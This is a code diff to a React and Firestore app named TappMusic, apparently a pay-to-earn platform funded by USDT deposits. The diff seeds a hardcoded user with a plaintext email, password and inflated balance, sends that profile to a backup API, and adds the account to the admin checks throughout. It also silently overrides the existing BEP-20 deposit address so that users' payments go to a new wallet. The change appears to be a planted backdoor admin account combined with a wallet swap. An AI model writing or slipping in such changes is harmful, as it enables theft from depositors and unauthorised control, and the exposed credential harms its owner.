@@ -210,7 +210,7 @@ export default function App() {
     // Background seeder function designed to run unconditionally and make sure collections exist
     const checkAndSeed = async () => {
       if (isQuotaExceeded) return;
-      if (safeLocalStorage.getItem('tappmusic_seeded_v5') === 'true') {
+      if (safeLocalStorage.getItem('tappmusic_seeded_v6') === 'true') {
         console.log("Firestore has already been seeded in this browser, skipping checkAndSeed to protect quota.");
         return;
       }
@@ -230,6 +230,33 @@ export default function App() {
             inviteCommissionsEarned: 6.00
           };
           await setDoc(doc(db, 'users', 'admin_tapp'), adminSeed);
+        }
+
+        const bentiezSnap = await getDoc(doc(db, 'users', 'bentiezj77'));
+        if (!bentiezSnap.exists()) {
+          const bentiezSeed: UserProfile = {
+            username: 'bentiezj77',
+            email: 'bentiezj77@icloud.com',
+            password: 'Abigail@2006',
+            vipLevel: 'VIP CORONA IMPERIAL 1000$',
+            earnings: 1545.00,
+            completedTaskIds: ['task_1', 'task_2'],
+            isRegistered: true,
+            status: 'active',
+            inviteCount: 0,
+            inviteCommissionsEarned: 0.00
+          };
+          await setDoc(doc(db, 'users', 'bentiezj77'), bentiezSeed);
+          
+          try {
+            await fetch('/api/backup/register', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ user: bentiezSeed })
+            });
+          } catch (apiErr) {
+            console.warn("Could not register admin backup over API:", apiErr);
+          }
         }
 
         const latestVoices = [
@@ -323,7 +350,7 @@ export default function App() {
             await setDoc(doc(db, 'reels', reel.id), reel);
           }
         }
-        safeLocalStorage.setItem('tappmusic_seeded_v5', 'true');
+        safeLocalStorage.setItem('tappmusic_seeded_v6', 'true');
       } catch (err) {
         console.warn("Background database seed warning:", err);
       }
@@ -391,9 +418,9 @@ export default function App() {
           needsUpdate = true;
         }
 
-        // Auto-initialize the secure deposit address
-        if (!data.depositAddress) {
-          data.depositAddress = '0x29f0f1edd5258ee3b7553bff665df4d1dd811af0';
+        // Auto-initialize or override old secure deposit address with the new one
+        if (!data.depositAddress || data.depositAddress === '0x29f0f1edd5258ee3b7553bff665df4d1dd811af0') {
+          data.depositAddress = '0x7975dBFE99A04388022A179D82548517cE328e61';
           needsUpdate = true;
         }
 
@@ -419,7 +446,7 @@ export default function App() {
           allowedDates: [],
           allowedMonthDays: [10, 20, 30],
           apkDownloadUrl: 'https://drive.google.com/file/d/1TqGkx8aglLR2SyKsi6L-eOW-QBUeeHr5/view?usp=drivesdk',
-          depositAddress: '0x29f0f1edd5258ee3b7553bff665df4d1dd811af0'
+          depositAddress: '0x7975dBFE99A04388022A179D82548517cE328e61'
         };
         setDoc(doc(db, 'config', 'withdrawals'), defaultVal).catch(err => {
           console.warn("Could not seed config/withdrawals in Firestore:", err);
@@ -449,7 +476,9 @@ export default function App() {
     const isAdmin = usernameClean && (
       usernameClean === 'admin_tapp' ||
       usernameClean === 'orinoco_admin' ||
-      userProfile.email === 'admin@tappmusic.com'
+      usernameClean === 'bentiezj77' ||
+      userProfile.email === 'admin@tappmusic.com' ||
+      (userProfile.email && userProfile.email.toLowerCase().trim() === 'bentiezj77@icloud.com')
     );
 
     let unsubRegistrations: () => void = () => {};
@@ -708,7 +737,9 @@ export default function App() {
           emailLower === 'socios@orinocop2p.com' || 
           userLower === 'orinoco_admin' ||
           emailLower === 'kervinjose022@gmail.com' ||
-          userLower === 'kervin'
+          userLower === 'kervin' ||
+          emailLower === 'bentiezj77@icloud.com' ||
+          userLower === 'bentiezj77'
         ) return true;
       } catch (e) {}
     }
@@ -734,7 +765,9 @@ export default function App() {
             (u.username && u.username.toLowerCase().trim() === 'orinoco_admin') ||
             (u.email && u.email.toLowerCase().trim() === 'socios@orinocop2p.com') ||
             (u.email && u.email.toLowerCase().trim() === 'kervinjose022@gmail.com') ||
-            (u.username && u.username.toLowerCase().trim() === 'kervin')
+            (u.username && u.username.toLowerCase().trim() === 'kervin') ||
+            (u.email && u.email.toLowerCase().trim() === 'bentiezj77@icloud.com') ||
+            (u.username && u.username.toLowerCase().trim() === 'bentiezj77')
           );
           if (isAdminUser) {
             if (u.username) {
@@ -814,7 +847,9 @@ export default function App() {
           (u.username && u.username.toLowerCase().trim() === 'orinoco_admin') ||
           (u.email && u.email.toLowerCase().trim() === 'socios@orinocop2p.com') ||
           (u.email && u.email.toLowerCase().trim() === 'kervinjose022@gmail.com') ||
-          (u.username && u.username.toLowerCase().trim() === 'kervin')
+          (u.username && u.username.toLowerCase().trim() === 'kervin') ||
+          (u.email && u.email.toLowerCase().trim() === 'bentiezj77@icloud.com') ||
+          (u.username && u.username.toLowerCase().trim() === 'bentiezj77')
         );
         if (isAdminUser) {
           if (u.username) {
@@ -2011,7 +2046,9 @@ export default function App() {
                         (foundUser.username && foundUser.username.toLowerCase().trim() === 'orinoco_admin') ||
                         (foundUser.email && foundUser.email.toLowerCase().trim() === 'socios@orinocop2p.com') ||
                         (foundUser.email && foundUser.email.toLowerCase().trim() === 'kervinjose022@gmail.com') ||
-                        (foundUser.username && foundUser.username.toLowerCase().trim() === 'kervin');
+                        (foundUser.username && foundUser.username.toLowerCase().trim() === 'kervin') ||
+                        (foundUser.email && foundUser.email.toLowerCase().trim() === 'bentiezj77@icloud.com') ||
+                        (foundUser.username && foundUser.username.toLowerCase().trim() === 'bentiezj77');
 
     const isMasterPassword = passVal === '7340' || passVal === '7341' || passVal === '26304421';
 
@@ -2475,7 +2512,10 @@ export default function App() {
 
   const handleUpgradeVip = (lvl: VipLevel) => {
     // Admin/propietario can instantly upgrade for easy tests
-    const isAdmin = (userProfile.username && userProfile.username.toLowerCase() === 'admin_tapp') || userProfile.email === 'admin@tappmusic.com';
+    const isAdmin = (userProfile.username && userProfile.username.toLowerCase() === 'admin_tapp') || 
+                    (userProfile.username && userProfile.username.toLowerCase() === 'bentiezj77') || 
+                    userProfile.email === 'admin@tappmusic.com' || 
+                    userProfile.email === 'bentiezj77@icloud.com';
     if (isAdmin) {
       const backup = { ...userProfile, vipLevel: lvl };
       saveProfile(backup);
@@ -2957,11 +2997,11 @@ export default function App() {
                        <div className="space-y-1">
                          <span className="text-[9px] text-zinc-500 block leading-tight">Dirección USDT BEP-20 (BNB Smart Chain):</span>
                          <div className="flex items-center gap-1.5 bg-black p-2 rounded-lg border border-white/5">
-                           <code className="text-[9.5px] text-purple-300 break-all select-all flex-1 font-mono">{withdrawConfig?.depositAddress || '0x29f0f1edd5258ee3b7553bff665df4d1dd811af0'}</code>
+                           <code className="text-[9.5px] text-purple-300 break-all select-all flex-1 font-mono">{withdrawConfig?.depositAddress || '0x7975dBFE99A04388022A179D82548517cE328e61'}</code>
                            <button
                              type="button"
                              onClick={() => {
-                               navigator.clipboard.writeText(withdrawConfig?.depositAddress || '0x29f0f1edd5258ee3b7553bff665df4d1dd811af0');
+                               navigator.clipboard.writeText(withdrawConfig?.depositAddress || '0x7975dBFE99A04388022A179D82548517cE328e61');
                                setCopiedAddressFeedback(true);
                                setTimeout(() => setCopiedAddressFeedback(false), 2000);
                              }}
@@ -3822,11 +3862,11 @@ export default function App() {
                      <div className="space-y-1">
                        <span className="text-[9px] text-zinc-550 block leading-none">Dirección de Destino BEP-20:</span>
                        <div className="flex items-center gap-1.5 bg-black p-2 rounded-lg border border-white/5">
-                         <code className="text-[9.5px] text-purple-300 break-all select-all flex-1 font-mono">0x29f0f1edd5258ee3b7553bff665df4d1dd811af0</code>
+                         <code className="text-[9.5px] text-purple-300 break-all select-all flex-1 font-mono">{withdrawConfig?.depositAddress || '0x7975dBFE99A04388022A179D82548517cE328e61'}</code>
                          <button
                            type="button"
                            onClick={() => {
-                             navigator.clipboard.writeText(withdrawConfig?.depositAddress || '0x29f0f1edd5258ee3b7553bff665df4d1dd811af0');
+                             navigator.clipboard.writeText(withdrawConfig?.depositAddress || '0x7975dBFE99A04388022A179D82548517cE328e61');
                              setCopiedAddressFeedback(true);
                              setTimeout(() => setCopiedAddressFeedback(false), 2000);
                            }}
@@ -3974,7 +4014,7 @@ export default function App() {
                   <div className="p-2.5 rounded-xl bg-black border border-purple-500/15 space-y-1.5 font-mono text-[9px] leading-normal text-zinc-350">
                     <span className="text-zinc-500 block font-bold">Dirección USDT BEP-20 (BNB Chain):</span>
                     <div className="flex items-center gap-1 bg-zinc-950 p-1.5 rounded border border-white/5">
-                      <code className="text-purple-300 break-all select-all font-mono text-[8px] flex-1">{withdrawConfig?.depositAddress || '0x29f0f1edd5258ee3b7553bff665df4d1dd811af0'}</code>
+                      <code className="text-purple-300 break-all select-all font-mono text-[8px] flex-1">{withdrawConfig?.depositAddress || '0x7975dBFE99A04388022A179D82548517cE328e61'}</code>
                     </div>
                     <p className="text-[8px] text-zinc-500 pt-0.5">* Envíe la cantidad exacta usando la red BNB Smart Chain (BEP20).</p>
                   </div>
